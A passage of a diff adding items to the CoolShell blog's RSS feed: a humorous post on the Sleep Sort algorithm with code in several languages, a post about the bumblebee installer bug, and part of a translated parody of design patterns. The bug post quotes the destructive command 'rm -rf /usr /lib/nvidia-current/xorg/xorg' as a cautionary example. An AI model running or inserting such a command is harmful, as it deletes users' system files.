src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="敏捷水管工" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a></li><li ><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/26.jpg" alt="再谈敏捷和ThoughtWorks中国咨询师" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_title">再谈敏捷和ThoughtWorks中国咨询师</a></li><li ><a href="https://coolshell.cn/articles/3766.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/feedback_cycle-150x150.jpg" alt="[转]TDD到底美还是不美？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3766.html" class="wp_rp_title">[转]TDD到底美还是不美？</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4891.html">Bob大叔和Jim Coplien对TDD的论战</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4891.html/feed</wfw:commentRss>
+			<slash:comments>54</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>排序算法 Sleep Sort</title>
+		<link>https://coolshell.cn/articles/4883.html</link>
+					<comments>https://coolshell.cn/articles/4883.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 23 Jun 2011 00:43:18 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Algorithm]]></category>
+		<category><![CDATA[Sleep]]></category>
+		<category><![CDATA[Sort]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4883</guid>
+
+					<description><![CDATA[<p>排序算法好像是程序员学习编程最多的算法，也可能是算法研究者们最喜欢研究的算法了。排序有很多很多的算法，比如，冒泡，插入，选择，堆，快速，归并等等（你可以看看本站...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4883.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4883.html">排序算法 Sleep Sort</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>排序算法好像是程序员学习编程最多的算法，也可能是算法研究者们最喜欢研究的算法了。排序有很多很多的算法，比如，冒泡，插入，选择，堆，快速，归并等等（你可以看看本站以前的那些文章：<a title="可视化的排序过程" href="https://coolshell.cn/articles/3933.html" target="_blank">可视化的排序</a>，<a title="一个排序算法比较的网站" href="https://coolshell.cn/articles/399.html" target="_blank">排序算法比较</a>，<a title="一个显示排序过程的Python脚本" href="https://coolshell.cn/articles/536.html" target="_blank">显示排序过程的python</a>）这里向大家介绍一个“巨NB”的排序算法——Sleep Sort。</p>
+<p>闲言少说，请看下面的代码（用Shell脚本写的）</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash
+function f() {
+    sleep &quot;$1&quot;
+    echo &quot;$1&quot;
+}
+while [ -n &quot;$1&quot; ]
+do
+    f &quot;$1&quot; &amp;
+    shift
+done
+wait</pre>
+<p>用法如下：</p>
+<p style="padding-left: 30px;">./sleepsort.bash 5 3 6 3 6 3 1 4 7</p>
+<p>相信你可以会去试一下这个脚本，也相你你试完后你一定会说——“<strong>我擦，真TMD排序了！</strong>”，我还是不要解释这段代码了，过多的解释会不如代码那么直接，而且解释会影响你对这个排序算法的NB性。只想说——<strong>这是正二八经的多线程、多进程排序啊</strong>。我们的<a title="可视化的排序过程" href="https://coolshell.cn/articles/3933.html" target="_blank">Bogo排序</a>也黯然失色啊。</p>
+<p>下面我们需要对这个算法做一些分析——</p>
+<p><span id="more-4883"></span>1）让我们来分析一个这这个程序的算法复杂度，太简单了，不就是O(最大数的秒数)，呵呵。所以，如果出现这样的数列将是恶梦的——2 1 4 3 2 1 99999999</p>
+<p>2）这个排序好是好，但对于负数或浮点数就有bug了。负数的解决方案是，我们可以这样来：x/2+MaxInt/2（时间可能相当长，不过依然工作）。对于浮点数，看看下面的代码.</p>
+<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash
+function f() {
+  sleep $(echo &quot;($2 - 1) + $1 / 10 ^ $2&quot; | bc -l)
+  echo &quot;$1&quot;
+}
+while [ -n &quot;$1&quot; ]
+do
+  f &quot;$1&quot; $(echo -n &quot;$1&quot; | wc -c) &amp;
+  shift
+done
+wait</pre>
+<p>3）我们来看看各种语言版本的实现吧。<br />
+<strong>Java</strong></p>
+<pre data-enlighter-language="java" class="EnlighterJSRAW">public class SleepSort {
+    public static void main(String[] args) {
+        int[] ints = {1,4,7,3,8,9,2,6,5};
+        SortThread[] sortThreads = new SortThread[ints.length];
+        for (int i = 0; i &lt; sortThreads.length; i++) {
+            sortThreads[i] = new SortThread(ints[i]);
+        }
+        for (int i = 0; i &lt; sortThreads.length; i++) {
+            sortThreads[i].start();
+        }
+    }
+}
+class SortThread extends Thread{
+    int ms = 0;
+    public SortThread(int ms){
+        this.ms = ms;
+    }
+    public void run(){
+        try {
+            sleep(ms*10+10);
+        } catch (InterruptedException e) {
+            // TODO Auto-generated catch block
+            e.printStackTrace();
+        }
+        System.out.println(ms);
+    }
+}</pre>
+<p><strong>Javascript</strong></p>
+<p>[javascript]function sleepsort() {<br />
+    for (var i = 0, il = arguments.length; i &lt; il; i++) {<br />
+        (function(args, index) {<br />
+            setTimeout(function() {<br />
+                document.body.innerHTML += args[index] + &#8216;, &#8216;;<br />
+            }, args[index]);<br />
+        }(arguments, i));<br />
+    }<br />
+};<br />
+[/javascript]</p>
+<p><strong>Brainfuck </strong>(关于这门语言，请<a title="BT雷人的程序语言（大全）" href="https://coolshell.cn/articles/4458.html" target="_blank">参看这篇文章</a>)</p>
+<p><code>,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br />
+&lt;&lt;[&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br />
+&lt;&lt;[ ----------[++++++++++&gt;----------]++++++++++<br />
+&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;&lt;-]  &gt;&gt;&gt;++++++[&lt;++++++++&gt;-]&lt;.&gt;.&gt;&gt;-]&lt;&lt;&lt;-]<br />
+,----------[----------------------.,----------]<br />
+,---&lt;&lt;&lt;+&gt;&gt;&gt;-------[----------------------.,----------]<br />
+&gt;&gt; ----------[++++++++++&gt;----------]++++++++++<br />
+&gt;++++++[&lt;++++++++&gt;-]&lt; ----------[++++++++++&gt;----------]++++++++++<br />
+.&gt;. ----------[++++++++++&gt;----------]++++++++++<br />
+&gt;++&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;&lt;-]  &gt;&gt;[&gt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;----------[++++++++++&gt;----------]++++++++++<br />
+&gt;++,&gt;,&gt;++++++++[&lt;------&lt;------&gt;&gt;-]<br />
+&lt;&lt;</code></p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/08/cuckoo-150x150.jpg" alt="Cuckoo Filter：设计与实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17225.html" class="wp_rp_title">Cuckoo Filter：设计与实现</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/puzzle-150x150.png" alt="谜题的答案和活动的心得体会" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11847.html" class="wp_rp_title">谜题的答案和活动的心得体会</a></li><li ><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/08/538efefbgw1eiz9cvx78fj20rm0fmdi8-150x150.jpg" alt="【活动】解迷题送礼物" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11832.html" class="wp_rp_title">【活动】解迷题送礼物</a></li><li ><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/10/QR-Code-Overview-150x150.jpeg" alt="二维码的生成细节和原理" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10590.html" class="wp_rp_title">二维码的生成细节和原理</a></li><li ><a href="https://coolshell.cn/articles/10427.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/10/buddy-memory-allocation-150x150.jpg" alt="伙伴分配器的一个极简实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10427.html" class="wp_rp_title">伙伴分配器的一个极简实现</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4883.html">排序算法 Sleep Sort</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4883.html/feed</wfw:commentRss>
+			<slash:comments>63</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>一个空格引发的惨剧</title>
+		<link>https://coolshell.cn/articles/4875.html</link>
+					<comments>https://coolshell.cn/articles/4875.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 20 Jun 2011 00:26:34 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[bumblebee]]></category>
+		<category><![CDATA[Code Review]]></category>
+		<category><![CDATA[Coding]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4875</guid>
+
+					<description><![CDATA[<p>你是否相信如果你的程序里没有检查一个变量会导致怎么系统瘫痪？无论你相不相信，这是我一个亲身经历过的案例，你可以在本站的程序员那些悲催的事儿中找到很多这样的事。这...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4875.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4875.html">一个空格引发的惨剧</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>你是否相信如果你的程序里没有检查一个变量会导致怎么系统瘫痪？无论你相不相信，这是我一个亲身经历过的案例，你可以在本站的<a title="程序员那些悲催的事儿" href="https://coolshell.cn/articles/3980.html" target="_blank">程序员那些悲催的事儿</a>中找到很多这样的事。这样的事昨天在发生，今天同样在发生。<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix40多年</a>了，在这40年里，程序员发生过各种各样的的惨剧，但是大多数的事情一而再再而三的重演。</p>
+<p>今天的你，可能在开发者各种各样NB的系统，你会相信你的一个空格也能导致系统瘫痪吗？也许你可能很难相信这个事。不过，再下面这个事将告诉你这个血淋淋的事实 —— 一个空格产生的bug可以让你的系统瘫痪。</p>
+<p><a href="https://github.com/MrMEEE/bumblebee">bumblebee</a>是一个开源项目，这个名字也就是变形金刚里的大黄蜂，这个项目是这样介绍自己的——</p>
+<blockquote><p>bumblebee is Optimus support for Linux, with real offloading, and not switchable graphics.. More important.. it works on Optimus Laptops without a graphical multiplexer..</p></blockquote>
+<p>Optimus 是NVIDIA的“优驰”技术，其可以将您的笔记本电脑PC提升到绝佳状态，提供出色的图形性能，并在需要时延长电池续航时间。这个项目是把这个技术移到Linux上来。</p>
+<p>这个项目本来不出名，不过，程序在其安装脚本install.sh里的一个bug让这个项目一下子成了全世界最瞩目的项目，这个bug的fix如下：</p>
+<pre data-enlighter-language="diff" class="EnlighterJSRAW">@@ -348,7 +348,7 @@ case &quot;$DISTRO&quot; in
+-  rm -rf /usr /lib/nvidia-current/xorg/xorg
++  rm -rf /usr/lib/nvidia-current/xorg/xorg</pre>
+<p>看明白了吗？<strong>空格</strong>。这个空格会导致什么样的问题呢？呵呵。你有没有感到菊花一紧？这个bug绝对的霸气外露！真是验证了<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">“如何写出无法维护代码</a>”的那句话——“<strong>测试你的程序是一种懦夫的行为</strong>”。</p>
+<p>不过，最精彩还不是这个bug，而是全世界程序员的对这个bug 的 code review comments，真的相当的欢乐。请强势围望！</p>
+<p><span id="more-4875"></span></p>
+<p style="text-align: center;"><a href="https://github.com/MrMEEE/bumblebee/commit/a047be85247755cdbe0acce6#diff-1">https://github.com/MrMEEE/bumblebee/commit/a047be85247755cdbe0acce6#diff-1</a></p>
+<p style="text-align: left;">重点是其中的很多图片——下面的图片众多。</p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115950761.gif"><img decoding="async" loading="lazy" title="clip_image001" src="http://pic003.cnblogs.com/2011/34358/201106/20110620115951113.gif" alt="clip_image001" width="500" height="275" /></a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062012551463.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115950761.gif"><br />
+</a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062012574297.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115951580.jpg"><img decoding="async" loading="lazy" title="clip_image002" src="http://pic003.cnblogs.com/2011/34358/201106/20110620115951524.jpg" alt="clip_image002" width="292" height="302" border="0" /></a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062012590122.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013022333.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013033063.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013042755.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115954514.jpg"><img decoding="async" loading="lazy" title="clip_image007" src="http://pic003.cnblogs.com/2011/34358/201106/2011062011595582.jpg" alt="clip_image007" width="406" height="455" border="0" /></a></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115958341.jpg"><img decoding="async" loading="lazy" title="clip_image010" src="http://pic003.cnblogs.com/2011/34358/201106/20110620115958644.jpg" alt="clip_image010" width="401" height="299" border="0" /></a></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115958163.jpg"><img decoding="async" loading="lazy" title="clip_image011" src="http://pic003.cnblogs.com/2011/34358/201106/20110620115959784.jpg" alt="clip_image011" width="408" height="404" border="0" /></a></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620115959641.jpg"><img decoding="async" loading="lazy" title="clip_image012" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120001976.jpg" alt="clip_image012" width="400" height="401" border="0" /></a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013060775.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120001777.gif"><img decoding="async" loading="lazy" title="clip_image014" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120001634.gif" alt="clip_image014" width="400" height="463" border="0" /></a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013073049.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120002955.gif" alt="" width="480" height="360" border="0" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013083437.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013090259.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120002899.jpg"><img decoding="async" loading="lazy" title="clip_image016" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120002202.jpg" alt="clip_image016" width="512" height="384" border="0" /></a></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013110568.jpg" alt="" /></p>
+<p style="text-align: center;"><img decoding="async" src="http://pic003.cnblogs.com/2011/1/201106/2011062013121496.jpg" alt="" /></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120002666.jpg"><img decoding="async" loading="lazy" title="clip_image019" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120002718.jpg" alt="clip_image019" width="397" height="804" border="0" /></a></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/20110620120003129.jpg"><img decoding="async" loading="lazy" title="clip_image020" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120003540.jpg" alt="clip_image020" width="594" height="488" border="0" /></a></p>
+<p style="text-align: center;"><a href="http://pic003.cnblogs.com/2011/34358/201106/2011062012000453.jpg"><img decoding="async" loading="lazy" title="clip_image021" src="http://pic003.cnblogs.com/2011/34358/201106/20110620120004356.jpg" alt="clip_image021" width="400" height="290" border="0" /></a></p>
+<p><img decoding="async" class="aligncenter" src="http://pic003.cnblogs.com/2011/1/201106/2011062013135533.jpg" alt="" /></p>
+<p style="text-align: left;">(全文完)</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/11432.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/04/code_review-150x150.jpg" alt="从Code Review 谈如何做技术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11432.html" class="wp_rp_title">从Code Review 谈如何做技术</a></li><li ><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="千万不要把 bool 设计成函数参数" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5444.html" class="wp_rp_title">千万不要把 bool 设计成函数参数</a></li><li ><a href="https://coolshell.cn/articles/5201.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/08/538efefbjw1dt8f6ua5rpg-150x150.gif" alt="重构代码的7个阶段" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5201.html" class="wp_rp_title">重构代码的7个阶段</a></li><li ><a href="https://coolshell.cn/articles/4758.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="如何写出无法维护的代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4758.html" class="wp_rp_title">如何写出无法维护的代码</a></li><li ><a href="https://coolshell.cn/articles/3005.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg" alt="代码重构的一个示例" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3005.html" class="wp_rp_title">代码重构的一个示例</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4875.html">一个空格引发的惨剧</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4875.html/feed</wfw:commentRss>
+			<slash:comments>106</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>“另类” 设计模式</title>
+		<link>https://coolshell.cn/articles/4844.html</link>
+					<comments>https://coolshell.cn/articles/4844.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 16 Jun 2011 00:46:28 +0000</pubDate>
+				<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[design pattern]]></category>
+		<category><![CDATA[Pattern]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4844</guid>
+
+					<description><![CDATA[<p>下面这篇文章来自这里：http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns，这篇文章有点意思...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4844.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4844.html">“另类” 设计模式</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>下面这篇文章来自这里：<a href="http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns" target="_blank">http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns</a>，这篇文章有点意思了，山寨了我们著名的Design Pattern。这篇文章并不是很容易翻译，也许我翻译的不好，大家多指正。另外，这篇文章将失去原有的趣味在于其使用了经典设计模式的单词很相似的单词，一走眼你还以为是正二八经的设计模式。呵呵。所以，我在下文中，我会保留原有的英文单词，并把真正的23个经典设计模式的英文名放在旁边（灰色）。这篇文章和之前的<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">如何写出无法维护的代码</a>有异曲同工，个人感觉都是比较欢乐的。</p>
+<p style="text-align: center;">&nbsp;</p>
+<p style="text-align: center; font-size: 14pt;"><strong>辞职模式<br />
+</strong><strong>Resign Patterns<br />
+</strong><strong><span style="color: #cccccc;">Design Patterns</span></strong></p>
+<div style="text-align: center;">不合式的非面向项目软件开发病症<br />
+Ailments of Unsuitable Project-Disoriented Software<br />
+<span style="color: #cccccc;">Elements of Reusable Object-Oriented Software</span></div>
+<div style="text-align: center;"><strong>作者</strong>：<a href="mailto:mitework@yercompany.com">Michael Duell</a></div>
+<h4 style="text-align: left;"><strong>概要</strong></h4>
+<div style="text-align: justify;">任何一个熟悉那本由四个人写的经典的设计模式书的朋友，应该知道那本书里的模式都是非常优雅和划时代的。然而，不幸的是，从那些老代码中无法提练出这些模式，因为，在出现这些模式前，大家都不会使用模式。因此，这项工作是从大量的代码中提练出一个模式的目录。这些模式都有充足和永恒的示例。希望你能享受阅读这些模式，但千万不要模仿并使用他们！</div>
+<h4 style="text-align: left;">1. Cremational Patterns 火葬模式 | <span style="color: #999999;">Creational patterns 创建模式</span></h4>
+<div style="text-align: left;">下面是五个 cremational patterns.</div>
+<h5 style="text-align: left;"><strong>1.1 Abject Poverty  一贫如洗 | <span style="color: #999999;">Abstract Factory 抽象工厂</span></strong></h5>
+<p style="text-align: justify;">Abject Poverty 模式能让你的软件相当难测试和维护， 并且需要巨大的财政支出，预算已经完全赤字。</p>
+<h5 style="text-align: left;"><strong>1.2 Blinder 眼罩模式 | <span style="color: #999999;">Builder 建造模式</span></strong></h5>
+<p style="text-align: justify;">Blinder 模式是一个应急有效的解决方案，其不需要考虑需求在未来的变化。目前，我们还不太清楚我们为什么叫Blinder模式，一种说法是他们会在写代码的时候被设计人员戴上眼罩，另一种说法是他们希望在维护代码的时候挖出双眼。</p>
+<h5 style="text-align: left;"><strong>1.3 Fallacy Method 错误方法 | <span style="color: #999999;">Factory method 工厂方法</span></strong></h5>
+<p style="text-align: justify;">Fallacy方法主要是在于处理一些不明显的案例。代码逻辑看上去是正确的，当只要某想要去测试一下，或是某个不明显的案例发生了，那些代码中的错误也就出现了。</p>
+<p style="text-align: justify;"><span id="more-4844"></span></p>
+<h5 style="text-align: left;"><strong>1.4 ProtoTry   尝试模式| <span style="color: #999999;">Prototype 原型模式</span></strong></h5>
+<p style="text-align: justify;">ProtoTry 模式一个快速而肮脏的软件开发工作模型的尝试。这个模式的原意本来是想在后面有时间总结一下教训并改进或重写这些代码，但是可惜的是没有时间。所以，这些代码也就成了众所周知的 legacy code &#8211; 旧代码。</p>
+<h5 style="text-align: left;"><strong>1.5 Simpleton 傻瓜模式 |<span style="color: #999999;"> Singleton 单例模式</span></strong></h5>
+<p style="text-align: justify;">Simpleton 模式，是把一个终极复杂的模式用于那些最最没有价值的工作上。这个模式精确地指出了人员的能力程度。</p>
+<p style="text-align: justify;">&nbsp;</p>
+<h4 style="text-align: left;"><strong>2. Destructural Patterns 无结构模式 | </strong><span style="color: #999999;">Structural patterns  结构模式</span></h4>
+<p style="text-align: left;">下面是七个经典的变性模式</p>
+<h5 style="text-align: left;"><strong>2.1 Adopter 领养者模式 |<span style="color: #999999;"> Adapter 适配器模式</span></strong></h5>
+<p style="text-align: justify;">Adopter模式提供了一个给那些“孤儿函数”的家。这这些函数和整个大家族别的函数看上去一点也不一样，他们和整个家族的唯一联系就是通过我们的Adopter。</p>
+<h5 style="text-align: left;"><strong>2.2 Brig 监狱模式 | <span style="color: #999999;">Bridge 桥接模式</span></strong></h5>
+<p style="text-align: left;">Brig 模式也就是那些坏代码的容器类。这就是众所周知的软件模块。</p>
+<h5 style="text-align: left;"><strong>2.3 Compromise 妥协模式 | <span style="color: #999999;">Composite 合成模式</span></strong></h5>
+<p style="text-align: justify;">Compromise 模式主要用来平衡软件开发的工期和质量。 使用这个模式的结果是——劣质的软件 + 延误的工期。</p>
+<h5 style="text-align: left;"><strong>2.4 Detonator 地雷模式 | <span style="color: #999999;">Decorator 修饰模式</span></strong></h5>
+<p style="text-align: justify;">Detonator 模式是极其普通的，在程序中放置一些不易查觉的地雷。一个常见的经典示例是只用两位数来表示年份。这个炸弹已经暴露出来了，并在那等着爆炸！（陈皓注：作者这里说的是千年虫问题，本文写在1997年）</p>
+<h5 style="text-align: left;"><strong>2.5 Fromage 干酪模式 | <span style="color: #999999;">Facade 外观模式</span></strong></h5>
+<p style="text-align: justify;">Fromage 模式让软件看上去满是漏洞。 Fromage 模式让我们的软件像Cheesy（芝士，也有劣质的意思）一样，有大量的奇淫巧技让你的软件没有任何一点可移值性。这个模式和奶酪一样，越是老越是香啊。</p>
+<h5 style="text-align: left;"><strong>2.6 Flypaper 捕蝇纸模式 | <span style="color: #999999;">Flyweight 享元模式</span></strong></h5>
+<p style="text-align: justify;">Flypaper 模式的意思是，代码是由设计的人完成，而由另一个人维护。维护着这个模式的那个写代码的人发现自己被粘住了，而且很有可能在软件失支控制前夭折。</p>
+<h5 style="text-align: left;"><strong>2.7 ePoxy 沥清模式 |<span style="color: #999999;"> Proxy 代理模式</span></strong></h5>
+<p style="text-align: justify;">ePoxy 模式主旨把软件的模式紧密地耦合在一起。随着耦合模块的增加，我们就可以看到沾粘它们的沥清。</p>
+<h4><strong>3. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式</strong></h4>
